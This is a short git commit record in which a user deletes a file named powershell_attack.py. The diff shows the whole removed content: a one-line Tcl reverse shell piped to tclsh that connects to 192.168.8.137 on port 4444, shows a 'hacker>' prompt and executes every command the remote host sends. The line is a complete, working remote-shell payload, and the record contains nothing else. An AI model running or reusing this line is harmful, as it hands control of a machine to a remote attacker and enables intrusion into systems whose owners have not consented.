da706eb12a16364bd61dac29294f10fc2507f773
mansourbader <61111442+mansourbader@users.noreply.github.com>
2020-05-02 22:43:14 -0400

    Delete powershell_attack.py

--- powershell_attack.py
+++
@@ -1,1 +0,0 @@
-echo 'set s [socket 192.168.8.137 4444];while 42 { puts -nonewline $s "hacker> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh &
